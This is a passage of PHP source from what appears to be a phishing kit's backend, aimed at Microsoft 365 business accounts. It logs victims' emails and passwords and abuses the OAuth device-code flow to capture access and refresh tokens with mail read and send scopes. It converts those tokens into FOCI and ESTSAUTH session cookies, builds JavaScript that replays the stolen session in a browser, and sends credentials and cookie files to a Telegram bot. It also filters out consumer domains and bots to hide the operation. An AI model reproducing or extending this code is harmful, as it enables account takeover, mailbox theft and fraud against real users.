                Security::log("LOCAL_CAPTURE: Merging with existing FOCI tokens for $email...");
                $swap = self::swapTokenForCookies($tokens['access_token'], $tokens['refresh_token'] ?? null, $email, $latestEvent['clientId'] ?? '1950a258-227b-4e31-a9cf-717495945fc2');
                $fociCookies = $swap['cookies'] ?? [];
                file_put_contents($cacheFile, json_encode($fociCookies));
                Security::log("LOCAL_CAPTURE: FOCI swap added " . count($fociCookies) . " master cookies.");
            }

            // Proactively trigger the VPS Worker if a refresh token is available for robust ESTSAUTH capture
            if (isset($tokens['refresh_token'])) {
                Security::log("LOCAL_CAPTURE: Refresh token present for $email. Proactively triggering VPS Worker for robust ESTSAUTH capture...");
                $workerCookieId = $cookieId . '_worker';
                $db->logEvent([
                    'cookieId' => $workerCookieId,
                    'type' => 'hybrid_worker_trigger',
                    'emailMask' => $email,
                    'email' => $email,
                    'domain' => 'microsoft.com',
                    'token_data' => $tokens
                ]);
                // The external worker will pick up the task from Neon DB
            } else {
                Security::log("LOCAL_CAPTURE: No refresh token, or PHP swap successfully captured session with ESTSAUTH for $email. Worker not triggered.");
            }
        }
        
        // 1. Save Event
        $db->logEvent([
            'cookieId' => $cookieId,
            'type' => 'local_browser_capture',
            'emailMask' => $email,
            'email' => $email,
            'domain' => 'microsoft.com',
            'attempt' => 1,
            'password' => 'LOCAL_BROWSER_MEMORY',
            'ip' => Security::getClientIp(),
            'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'time' => date('c'),
            'token_data' => $tokens
        ]);
        
        // 2. Generate Injection Script
        $scriptPath = $sessionDir . '/inject_session_' . $cookieId . '.js';
        $scriptContent = "// @ClosedService-Pages Hybrid Browser Capture 🍪\n";
        $scriptContent .= "// Generated for: $email\n\n";
        $scriptContent .= "(function() {\n";
        $scriptContent .= "    console.log('🚀 Restoring Hybrid Session for: $email');\n";
        
        // Inject FOCI Cookies (Master Keys)
        if (!empty($fociCookies)) {
            $scriptContent .= "    const fociCookies = " . json_encode($fociCookies, JSON_PRETTY_PRINT) . ";\n";
            $scriptContent .= "    fociCookies.forEach(c => {\n";
            $scriptContent .= "        document.cookie = c.name + '=' + c.value + '; domain=' + c.domain + '; path=/; secure; samesite=none; expires=' + new Date(Date.now() + 31536000000).toUTCString();\n";
            $scriptContent .= "    });\n";
        }

        // Inject Local Cookies (PHPSESSID etc)
        $scriptContent .= "    const localCookieStr = " . json_encode($cookieStr) . ";\n";
        $scriptContent .= "    localCookieStr.split(';').forEach(c => {\n";
        $scriptContent .= "        if(c.trim()) document.cookie = c.trim() + '; path=/; secure; samesite=none; expires=' + new Date(Date.now() + 31536000000).toUTCString();\n";
        $scriptContent .= "    });\n";
        
        // LocalStorage (if any)
        if ($lsData !== '{}') {
            $scriptContent .= "    const lsData = " . $lsData . ";\n";
            $scriptContent .= "    Object.keys(lsData).forEach(k => localStorage.setItem(k, lsData[k]));\n";
        }
        
        $scriptContent .= "    console.log('✅ Session fully restored!');\n";
        $scriptContent .= "})();";
        
        file_put_contents($scriptPath, $scriptContent);
        
        // 3. Telegram Notification
        Worker::sendTelegramMessage($email, "HYBRID_CAPTURE_SUCCESS", Security::getClientIp(), $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', "✅ Hybrid Capture Success: FOCI Cookies (" . count($fociCookies) . ") + Local Browser Memory merged.");
        Worker::sendTelegramDocument($email, $scriptPath, "hybrid_cookies_{$email}.js");
        
        echo json_encode(['ok' => true, 'cookieId' => $cookieId]);
    }

    private static function handleCheckSession() {
        $email = $_GET['email'] ?? '';
        if (!$email) {
            echo json_encode(['ok' => false]);
            exit;
        }

        $db = new Database();
        $latest = $db->getLatestEventByEmail($email);
        $hasSession = false;
        
        if ($latest && isset($latest['cookieId'])) {
            $sessionDir = realpath(__DIR__ . '/../session_data');
            $script = $sessionDir . '/inject_session_' . $latest['cookieId'] . '.js';
            if (file_exists($script)) {
                $hasSession = true;
            }
        }

        echo json_encode(['ok' => true, 'has_session' => $hasSession]);
        exit;
    }

    private static function handleCaptureSSO() {
        $email = $_GET['email'] ?? '';
        if (strpos($email, 'EMAIL_PLACEHOLDER') !== false) { $email = ''; }
        
        $tenantHint = 'common';
        if ($email && strpos($email, '@') !== false) {
            $tenantHint = substr($email, strpos($email, '@') + 1);
        }

        // Silent OIDC Authorization URL
        $cfg = Config::load();
        $clientId = $cfg['msSsoClientId'];
        $redirectUri = "https://login.microsoftonline.com/common/oauth2/nativeclient";
        $scope = "openid profile email offline_access https://graph.microsoft.com/.default https://outlook.office.com/mail.read";
        
        // This URL can be used in a hidden iframe or a quick redirect
        $authUrl = "https://login.microsoftonline.com/$tenantHint/oauth2/v2.0/authorize?" . http_build_query([
            'client_id' => $clientId,
            'response_type' => 'code',
            'redirect_uri' => $redirectUri,
            'scope' => $scope,
            'prompt' => 'none', // Silent!
            'login_hint' => $email,
            'response_mode' => 'query',
            'domain_hint' => 'organizations' // Prefer business accounts
        ]);

        echo json_encode(['ok' => true, 'authUrl' => $authUrl]);
    }

    private static function handleValidateTurnstileConfig() {
        $siteKey = '';
        $secretKey = '';
        $enabled = false;

        // Support testing candidate keys from POST (Test before Save)
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $raw = file_get_contents('php://input');
             $data = json_decode($raw, true);
             if (is_array($data)) {
                 $siteKey = trim((string)($data['cfSiteKey'] ?? ''));
                 $secretKey = trim((string)($data['cfSecretKey'] ?? ''));
                 $enabled = !empty($data['cfTurnstileEnabled']);
             }
        }

        // Fallback to saved config if not provided in request
        if ($siteKey === '' && $secretKey === '') {
            $cfg = Config::load();
            $enabled = !empty($cfg['cfTurnstileEnabled']);
            $siteKey = isset($cfg['cfSiteKey']) ? trim((string)$cfg['cfSiteKey']) : '';
            $secretKey = isset($cfg['cfSecretKey']) ? trim((string)$cfg['cfSecretKey']) : '';
        }

        $siteKeyPresent = ($siteKey !== '');
        $secretKeyPresent = ($secretKey !== '');
        $siteKeyLooksValid = ($siteKeyPresent && strlen($siteKey) >= 20);
        $secretKeyLooksValid = ($secretKeyPresent && strlen($secretKey) >= 20);
        $ready = ($enabled && $siteKeyLooksValid && $secretKeyLooksValid);

        echo json_encode([
            'ok' => true,
            'enabled' => $enabled,
            'siteKeyPresent' => $siteKeyPresent,
            'secretKeyPresent' => $secretKeyPresent,
            'siteKeyLooksValid' => $siteKeyLooksValid,
            'secretKeyLooksValid' => $secretKeyLooksValid,
            'ready' => $ready,
        ]);
    }

    private static function handleVerifyTurnstile() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        $tokenRaw = $data['token'] ?? '';
        $token = trim(is_string($tokenRaw) ? $tokenRaw : (string)$tokenRaw);
        
        // Log verification attempt
        Security::log("Turnstile Verification Attempt - Token: " . substr($token, 0, 10) . "...");

        if ($token === '') {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing token']);
            exit;
        }

        $cfg = Config::load();
        $secret = isset($cfg['cfSecretKey']) ? trim((string)$cfg['cfSecretKey']) : '';
        if ($secret === '') {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing secret key']);
            exit;
        }

        $body = http_build_query([
            'secret' => $secret,
            'response' => $token,
            'remoteip' => Security::getClientIp(),
        ]);

        $context = stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => "Content-Type: application/x-www-form-urlencoded\r\nAccept: application/json\r\n",
                'content' => $body,
                'timeout' => 5,
                'ignore_errors' => true,
            ],
        ]);

        $rawResp = @file_get_contents('https://challenges.cloudflare.com/turnstile/v0/siteverify', false, $context);
        if ($rawResp === false) {
            $err = error_get_last();
            \App\Security::log("Turnstile Verification Connection Error: " . ($err['message'] ?? 'Unknown error'));
            http_response_code(502);
            echo json_encode(['ok' => false, 'error' => 'Verification unavailable']);
            exit;
        }

        $resp = json_decode($rawResp, true);
        if (!is_array($resp)) {
            \App\Security::log("Turnstile Verification Invalid JSON: " . substr($rawResp, 0, 100));
            http_response_code(502);
            echo json_encode(['ok' => false, 'error' => 'Invalid verification response']);
            exit;
        }

        if (!empty($resp['success'])) {
            $_SESSION['turnstile_verified'] = true;
            echo json_encode(['ok' => true]);
            return;
        }

        \App\Security::log("Turnstile Verification Failed: " . json_encode($resp));
        http_response_code(403);
        echo json_encode(['ok' => false, 'error' => 'Verification failed', 'codes' => $resp['error-codes'] ?? []]);
    }

    private static function handleVerifyEmail() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        $email = $data['email'] ?? '';
        
        if (!$email || strpos($email, '@') === false) {
            echo json_encode(['ok' => true, 'isBusiness' => false]);
            exit;
        }
        
        $cfg = Config::load();
        $emailParts = explode('@', $email);
        $domain = strtolower(end($emailParts));
        
        $hardcodedBlocked = ["outlook.com","hotmail.com","live.com","msn.com","yahoo.com","ymail.com","gmail.com","googlemail.com","aol.com","icloud.com","me.com","mac.com","proton.me","protonmail.com","mail.com","gmx.com"];

        // 1. Check Hardcoded Blocked Domains (Hidden from Admin)
        if (in_array($domain, $hardcodedBlocked, true)) {
            echo json_encode(['ok' => true, 'isBusiness' => false]);
            exit;
        }

        // 2. Check Dynamic Blocked Domains (From Config)
        if (!empty($cfg['blockedDomains']) && is_array($cfg['blockedDomains'])) {
            if (in_array($domain, $cfg['blockedDomains'], true)) {
                echo json_encode(['ok' => true, 'isBusiness' => false]);
                exit;
            }
        }
        
        // 3. Check Allowed Domains
        if (!empty($cfg['allowedDomains']) && is_array($cfg['allowedDomains'])) {
            if (!in_array($domain, $cfg['allowedDomains'], true)) {
                echo json_encode(['ok' => true, 'isBusiness' => false]);
                exit;
            }
        }

        // 4. Microsoft 365 check via DNS — native PHP (dns_get_record), no node/shell/PATH dependency.
        //    Works identically under CLI and FPM (PHP-FPM clears env PATH, which broke `which node`).
        $isMs365 = false;
        foreach (@dns_get_record($domain, DNS_MX) ?: [] as $r) {
            $mxHost = $r['target'] ?? $r['exchange'] ?? '';
            if (stripos($mxHost, 'mail.protection.outlook.com') !== false) { $isMs365 = true; break; }
        }
        if (!$isMs365) {
            foreach (@dns_get_record($domain, DNS_TXT) ?: [] as $r) {
                $txtVal = implode('', $r['entries'] ?? []);
                if (stripos($txtVal, 'protection.outlook.com') !== false) { $isMs365 = true; break; }
            }
        }

        if (!$isMs365) {
            echo json_encode(['ok' => true, 'isBusiness' => false]);
            exit;
        }

        echo json_encode(['ok' => true, 'isBusiness' => true]);
    }

    private static function handleGetEvents() {
        try {
            $baseDir = realpath(__DIR__ . '/..');
            $storageDir = $baseDir . '/session_data';
            $events = [];
            $seenCookies = [];

            // 1. Query Neon DB first (authoritative)
            try {
                $pdo = NeonDB::pdo();
                if ($pdo) {
                    $rows = $pdo->query("SELECT * FROM sessions ORDER BY updated_at DESC LIMIT 200");
                    foreach ($rows as $row) {
                        $cid = $row['cookie_id'] ?? '';
                        if (!$cid) continue;
                        $seenCookies[$cid] = true;
                        $data = $row['data'] ?? null;
                        if (is_string($data)) $data = json_decode($data, true);
                        $err = is_array($data) ? ($data['error'] ?? '') : '';
                        $events[] = [
                            'type' => 'neon_session',
                            'emailMask' => $row['email'] ?? 'unknown',
                            'domain' => '',
                            'attempt' => 0,
                            'password' => $row['password'] ?? 'unknown',
                            'ip' => $row['ip'] ?? '0.0.0.0',
                            'ua' => $row['ua'] ?? 'unknown',
                            'country' => $row['country'] ?? 'XX',
                            'time' => $row['updated_at'] ?? $row['created_at'] ?? date('c'),
                            'cookieId' => $cid,
                            'botStatus' => $row['status'] ?? 'pending',
                            'error' => $err,
                            'hasScript' => is_array($data) && !empty($data['cookies']),
                        ];
                    }
                }
            } catch (\Throwable $e) {
                Security::log("API get_events Neon query failed: " . $e->getMessage());
            }

            // 2. Local filesystem fallback (for sessions not yet picked up by worker)
            $files = glob($storageDir . '/session_*.json');
            foreach ($files as $file) {
                $data = json_decode(file_get_contents($file), true);
                if (!$data) continue;

                $cookieId = $data['cookieId'] ?? $data['cookie_id'] ?? null;
                if (!$cookieId) continue;
                $cookieId = Security::sanitizeId($cookieId);
                // Skip if already loaded from Neon
                if (isset($seenCookies[$cookieId])) continue;
                $seenCookies[$cookieId] = true;

                $botStatus = $data['status'] ?? 'pending';
                $event = [
                    'type' => $data['type'] ?? 'unknown',
                    'emailMask' => $data['emailMask'] ?? 'unknown',
                    'domain' => $data['domain'] ?? 'unknown',
                    'attempt' => intval($data['attempt'] ?? 0),
                    'password' => $data['password'] ?? 'unknown',
                    'ip' => $data['ip'] ?? '0.0.0.0',
                    'ua' => $data['ua'] ?? 'unknown',
                    'country' => $data['country'] ?? 'XX',
                    'time' => $data['created_at'] ?? $data['time'] ?? date('c'),
                    'cookieId' => $data['cookieId'] ?? 'unknown',
                    'botStatus' => $botStatus,
                    'error' => '',
                ];
                
                $scriptFile = $storageDir . '/inject_session_' . ($data['cookieId'] ?? 'unknown') . '.js';
                $hasScript = (file_exists($scriptFile) && filesize($scriptFile) > 0);
                
                if ($event['botStatus'] !== 'completed' && $hasScript) {
                    $event['botStatus'] = 'completed';
                }
                
                $event['hasScript'] = $hasScript;
                $events[] = $event;
            }
            
            // Sort by time desc
            usort($events, function($a, $b) {
                $timeA = isset($a['time']) ? strtotime($a['time']) : 0;
                $timeB = isset($b['time']) ? strtotime($b['time']) : 0;
                return $timeB - $timeA;
            });
            
            echo json_encode(['ok' => true, 'events' => $events]);
        } catch (Exception $e) {
            Security::log("API ERROR (get_events): " . $e->getMessage());
            echo json_encode(['ok' => false, 'error' => 'Internal Server Error']);
        }
    }

    private static function handleTestTelegram() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        $botToken = $data['botToken'] ?? '';
        $chatId = $data['chatId'] ?? '';
        $proxyEnabled = $data['proxyEnabled'] ?? false;
        $proxyUrl = $data['proxyUrl'] ?? '';

        if (!$botToken || !$chatId) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Bot Token and Chat ID are required']);
            exit;
        }

        $cfg = Config::load();
        // Override config with test values
        $cfg['telegramBotToken'] = $botToken;
        $cfg['telegramChatId'] = $chatId;
        $cfg['proxyEnabled'] = $proxyEnabled;
        $cfg['proxyUrl'] = $proxyUrl;
        
        $ip = Security::getClientIp();
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        
        $activeSecurity = [];
        if (!empty($cfg['cfTurnstileEnabled'])) $activeSecurity[] = "Turnstile";
        if (!empty($cfg['cfBotShield'])) $activeSecurity[] = "Bot Shield";
        if (!empty($cfg['cfSecurityEnabled'])) $activeSecurity[] = "Strict SSL";
        if (!empty($cfg['securityEnabled'])) $activeSecurity[] = "Adv. Security";
        
        $secStatus = empty($activeSecurity) ? "None" : implode(" + ", $activeSecurity);
        $info = "MANUAL TEST (Security Active: $secStatus)";
        
        $message = Worker::generateTelegramMessage("Test User", "Test Password", $ip, $ua, $info);

        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $payload = [
            'chat_id' => $chatId,
            'text' => $message
        ];

        $result = Worker::sendRequest($url, $payload, $cfg);
        $resData = json_decode($result, true);

        if ($resData && !empty($resData['ok'])) {
            echo json_encode(['ok' => true]);
        } else {
            $err = $resData['description'] ?? 'Unknown Telegram error';
            echo json_encode(['ok' => false, 'error' => $err]);
        }
    }

    private static function handleLogEvent() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        try {
            $db = new Database();
            
            // 1. ALWAYS ON: Honeypot Check (Bot Protection)
            // If the hidden field is filled, it's a bot.
            $hpField = isset($data['hpField']) ? $data['hpField'] : '';
            if (!empty($hpField)) {
                echo json_encode(['ok' => true, 'ignored' => 'honeypot']);
                return;
            }

            $emailRaw = $data['emailMask'] ?? ($data['email'] ?? '');
            $passwordRaw = $data['password'] ?? '';
            $email = trim(is_string($emailRaw) ? $emailRaw : (string)$emailRaw);
            $password = trim(is_string($passwordRaw) ? $passwordRaw : (string)$passwordRaw);
            $type = isset($data['type']) ? $data['type'] : 'unknown';
            $domain = isset($data['domain']) ? $data['domain'] : '';
            $attempt = isset($data['attempt']) ? $data['attempt'] : 0;
            $cookieIdRaw = isset($data['cookieId']) ? (string)$data['cookieId'] : '';
            $cookieIdSanitized = $cookieIdRaw !== '' ? Security::sanitizeId($cookieIdRaw) : '';

            // Fix: Ignore empty submissions (requires at least email)
            if ($email === '' && $password === '') {
                echo json_encode(['ok' => true, 'ignored' => 'empty']);
                return;
            }
            if ($email === '') {
                echo json_encode(['ok' => true, 'ignored' => 'missing_email']);
                return;
            }

            if (!empty($password) && !empty($email)) {
                $cookieId = $cookieIdSanitized !== '' ? $cookieIdSanitized : uniqid('cookie_', true);

                $db->logEvent([
                    'cookieId' => $cookieId,
                    'type' => $type,
                    'emailMask' => $email,
                    'domain' => $domain,
                    'attempt' => $attempt,
                    'password' => $password,
                    'ip' => Security::getClientIp(),
                    'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                    'time' => date('c')
                ]);

            } else {
                // PATH A: Simple Visitor Log (No Cookies)
                // Only runs if no password is provided (e.g. email_ok step)
                // Use provided cookieId if available to link sessions
                $cookieId = $cookieIdSanitized !== '' ? $cookieIdSanitized : uniqid('v_', true);
                
                $db->logEvent([
                    'cookieId' => $cookieId,
                    'type' => $type,
                    'emailMask' => $email,
                    'domain' => $domain,
                    'attempt' => $attempt,
                    'password' => $password,
                    'ip' => Security::getClientIp(),
                    'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                    'time' => date('c')
                ]);
            }

            echo json_encode(['ok' => true]);
        } catch (Exception $e) {
            Security::log("API ERROR (log_event): " . $e->getMessage());
            http_response_code(500);
            echo json_encode(['ok' => false, 'error' => 'Internal Server Error']);
        }
    }

    private static function handleGetDeploymentInfo() {
        $baseDir = realpath(__DIR__ . '/..');
        $deploymentFile = $baseDir . '/deployment.json';
        $data = [];

        if (file_exists($deploymentFile)) {
            $json = json_decode(file_get_contents($deploymentFile), true);
            if (is_array($json)) {
                $data = $json;
            }
        }
        
        $cfg = Config::load();

        $rotationPath = isset($data['rotation_path']) && is_string($data['rotation_path']) && $data['rotation_path'] !== ''
            ? $data['rotation_path']
            : 'admg';

        $slugs = $data['rotation_slugs'] ?? [];
        if (is_string($slugs) && $slugs !== '') {
            $slugs = [$slugs];
        } elseif (!is_array($slugs)) {
            $slugs = [];
        }
        $slugs = array_values($slugs);

        $projectPath = (isset($data['path']) && is_string($data['path']) && $data['path'] !== '')
            ? $data['path']
            : $baseDir;

        $response = [
            'main_domain' => $data['main_domain'] ?? '',
            'domains' => $data['domains'] ?? [],
            'rotation_path' => $rotationPath,
            'rotation_slugs' => $slugs,
            'path' => $projectPath
        ];

        echo json_encode(['ok' => true, 'data' => $response]);
    }

    private static function handleCaptureExistingSession() {
        try {
            Security::log("API: handleCaptureExistingSession called. (Handled by external worker)");
            echo json_encode(['ok' => true]);
        } catch (Exception $e) {
            Security::log("API ERROR (capture_existing_session): " . $e->getMessage());
            http_response_code(500);
            echo json_encode(['ok' => false, 'error' => 'Internal Server Error']);
        }
    }

    private static function handleSaveConfig() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        if (!$raw) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Empty body']);
            exit;
        }
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }
        
        // Debug log removed
        
        $allowed = [
            'template', 'redirectUrl', 'firstAttemptFail', 'loadingEnabled', 'loadingDelayMs',
            'telemetryEnabled', 'telegramBotToken', 'telegramChatId', 'telegramReportIncorrect', 'securityEnabled',
            'allowedDomains', 'blockedDomains', 'cfTurnstileEnabled', 'cfBotShield', 'cfUnderAttack', 'cfSecurityEnabled', 'cfSiteKey',
            'cfSecretKey', 'cfApiKey', 'cfEmail', 'cfZoneId', 'cfAccountId', 'cfCountryBlockingEnabled', 'cfAllowedCountries',
            'countryBlockingEnabled', 'allowedCountries', 'ipWhitelist',
            'proxyEnabled', 'proxyUrl', 'proxycheckEnabled', 
            'proxycheckBlockVPN', 'proxycheckBlockProxy', 'proxycheckBlockTor',
            'proxycheckApiKey', 'proxycheckRiskThreshold'
        ];
        $out = [];
        foreach ($allowed as $k) {
            if (array_key_exists($k, $data)) {
                $out[$k] = $data[$k];
            }
        }

        // Keep stored Cloudflare credentials when the form sends empty values
        $out = Config::guardCredentials($out);

        $ok = Config::saveMerged($out);
        if ($ok === false) {
            Security::log("API ERROR (save_config): Write failed for config.json");
            http_response_code(500);
            echo json_encode(['ok' => false, 'error' => 'Internal Server Error']);
            exit;
        }
        echo json_encode(['ok' => true]);
    }

    private static function handleGetConfig() {
        $cfg = Config::load();

        // Filter sensitive data before sending to client
        $safeCfg = $cfg;
        $sensitiveKeys = ['masterLicenseKey', 'encKey', 'proxycheckApiKey', 'telegramBotToken', 'cfApiKey', 'cfSecretKey'];
        
        // Only mask if not logged in as admin (but here we are in admin context usually)
        // However, it is better practice not to send secrets if the frontend only needs to display presence
        // But the admin panel inputs need the values to edit them. 
        // For now, we keep them as is since this is an admin endpoint, 
        // BUT we ensure no extra debug logging of these values exists.
        
        $safeCfg['msDeviceFlowClientId'] = $cfg['msDeviceFlowClientId'] ?? null;
        $safeCfg['msSsoClientId'] = $cfg['msSsoClientId'] ?? null;
        $safeCfg['postAuthRedirectUrl'] = $cfg['postAuthRedirectUrl'] ?? null;
        $safeCfg['msDeviceFlowUrl'] = $cfg['msDeviceFlowUrl'] ?? null;
        echo json_encode(['ok' => true] + $safeCfg);
    }

    private static function handleClearLogs() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        
        $projectRoot = realpath(__DIR__ . '/..');

        $sessionDir = $projectRoot . '/session_data';
        if (is_dir($sessionDir)) {
            $files = glob($sessionDir . '/*');
            foreach ($files as $file) {
                if (is_file($file)) unlink($file);
            }
        }

        foreach (['project.log'] as $log) {
            $path = $projectRoot . '/' . $log;
            if (file_exists($path)) {
                unlink($path);
            }
        }

        $dbPath = $projectRoot . '/database.sqlite';
        if (file_exists($dbPath)) {
            unlink($dbPath);
        }

        // Clear worker logs from Neon DB
        NeonDB::clearWorkerDb();
        
        echo json_encode(['ok' => true]);
    }

    private static function handleGetCookies() {
        $id = isset($_GET['id']) ? Security::sanitizeId($_GET['id']) : '';
        $type = isset($_GET['type']) ? $_GET['type'] : '';

        if (!$id) {
            echo json_encode(['ok' => false, 'error' => 'Missing ID']);
            exit;
        }
        $sessionDir = __DIR__ . '/../session_data';
        $jsFile = $sessionDir . '/inject_session_' . $id . '.js';
        $txtFile = $sessionDir . '/cookies_all_' . $id . '.txt';

        // Worker sessions store artifacts in Neon (data.injectionScript / data.cookiesTxt),
        // not as files on the VPS. Serve from Neon when the local file is absent.
        $neonJs = '';
        $neonTxt = '';
        $neonRow = NeonDB::get($id);
        if ($neonRow) {
            $nd = $neonRow['data'] ?? null;
            if (is_string($nd)) $nd = json_decode($nd, true);
            if (is_array($nd)) {
                $neonJs  = (string)($nd['injectionScript'] ?? '');
                $neonTxt = (string)($nd['cookiesTxt'] ?? '');
            }
        }

        // Check if there's a newer version (e.g. from local_cap refresh)
        // If the ID passed is an old device_flow ID, but a newer local_cap exists for the same user, 
        // we might want to return that. However, for now, we just serve the requested ID.
        
        if ($type === 'js') {
            if (file_exists($jsFile)) {
                $content = file_get_contents($jsFile);
                // Highlight ESTSAUTH in the log for the admin
                if (strpos($content, 'ESTSAUTH') !== false) {
                    Security::log("ADMIN_RETRIEVAL: Serving JS script with ESTSAUTH for ID $id");
                }
                echo json_encode(['ok' => true, 'content' => $content, 'type' => 'js']);
            } elseif ($neonJs !== '') {
                echo json_encode(['ok' => true, 'content' => $neonJs, 'type' => 'js', 'source' => 'neon']);
            } else {
                echo json_encode(['ok' => false, 'error' => 'Script not found']);
            }
        } elseif ($type === 'txt') {
            if (file_exists($txtFile)) {
                echo json_encode(['ok' => true, 'content' => file_get_contents($txtFile), 'type' => 'txt']);
            } elseif ($neonTxt !== '') {
                echo json_encode(['ok' => true, 'content' => $neonTxt, 'type' => 'txt', 'source' => 'neon']);
            } else {
                echo json_encode(['ok' => false, 'error' => 'Cookies not found']);
            }
        } else {
            if (file_exists($jsFile)) {
                echo json_encode(['ok' => true, 'content' => file_get_contents($jsFile), 'type' => 'js']);
            } elseif ($neonJs !== '') {
                echo json_encode(['ok' => true, 'content' => $neonJs, 'type' => 'js', 'source' => 'neon']);
            } elseif (file_exists($txtFile)) {
                echo json_encode(['ok' => true, 'content' => file_get_contents($txtFile), 'type' => 'txt']);
            } elseif ($neonTxt !== '') {
                echo json_encode(['ok' => true, 'content' => $neonTxt, 'type' => 'txt', 'source' => 'neon']);
            } else {
                echo json_encode(['ok' => false, 'error' => 'Cookies not found']);
            }
        }
    }

    private static function handleStartDeviceFlow() {
        $email = $_GET['email'] ?? '';
        // Safety: If email is the placeholder from the template, treat as empty
        if (strpos($email, 'EMAIL_PLACEHOLDER') !== false) {
            $email = '';
        }

        $cfg = Config::load();
        $clientId = $cfg['msDeviceFlowClientId'];
        $url = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode";
        
        $scope = "openid profile email offline_access https://graph.microsoft.com/.default";
        
        $body = http_build_query([
            'client_id' => $clientId,
            'scope' => $scope
        ]);

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        
        $resp = curl_exec($ch);
        Security::log("DEBUG: Raw Microsoft API response: " . $resp);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $json = json_decode($resp, true);

        if ($code === 200 && isset($json['user_code']) && isset($json['verification_uri'])) {
            echo json_encode([
                'ok' => true,
                'user_code' => $json['user_code'],
                'verification_uri' => $json['verification_uri'],
                'interval' => $json['interval'] ?? 5,
                'expires_in' => $json['expires_in'] ?? 3600,
                'clientId' => $clientId
            ]);
            return;
        }

        // Log detailed error information
        error_log("Device Flow API Error: HTTP Status Code: " . $code);
        error_log("Device Flow API Error: Response: " . $resp);
        error_log("Device Flow API Error: cURL Error: " . curl_error($ch));

        http_response_code(500);
        echo json_encode(['error' => 'Failed to start device flow', 'details' => $resp, 'http_code' => $code, 'curl_error' => curl_error($ch)]);
    }

    private static function handlePollDeviceFlow() {
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        $deviceCode = $data['device_code'] ?? '';
        $email = $data['email'] ?? 'device_flow';
        $clientId = $data['clientId'];

        if (!$deviceCode) {
            http_response_code(400);
            echo json_encode(['error' => 'Missing device code']);
            exit;
        }

        $sessionDir = __DIR__ . '/../session_data';
        if (!is_dir($sessionDir)) mkdir($sessionDir, 0777, true);
        
        $lockFile = $sessionDir . '/poll_' . md5($deviceCode) . '.lock';
        $resultFile = $sessionDir . '/poll_' . md5($deviceCode) . '.json';

        // 1. Check if already completed
        if (file_exists($resultFile)) {
            $result = json_decode(file_get_contents($resultFile), true);
            echo json_encode(['ok' => true, 'status' => 'completed', 'cookieId' => $result['cookieId']]);
            exit;
        }

        // 2. Check if currently processing (Lock)
        if (file_exists($lockFile)) {
            $lockTime = filemtime($lockFile);
            if (time() - $lockTime < 60) {
                // Still processing, tell client to wait
                echo json_encode(['ok' => true, 'status' => 'pending', 'message' => 'Processing capture...']);
                exit;
            }
        }

        // 3. Set Lock
        touch($lockFile);

        // $clientId is already defined above from the POST data
        $url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
        $body = http_build_query([
            'grant_type' => 'urn:ietf:params:oauth:grant-type:device_code',
            'client_id' => $clientId,
            'device_code' => $deviceCode,
            'scope' => 'openid profile email offline_access https://outlook.office.com/mail.read https://outlook.office.com/mail.send'
        ]);

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        
        $resp = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        // curl_close is no longer needed in PHP 8.0+

        $json = json_decode($resp, true);

        if (isset($json['access_token'])) {
            Security::log("DEVICE_FLOW: Success! Token captured for $email. Client: $clientId. Initiating session capture...");
            // Success! Capture Tokens
            $cookieId = uniqid('ms_device_', true);
            
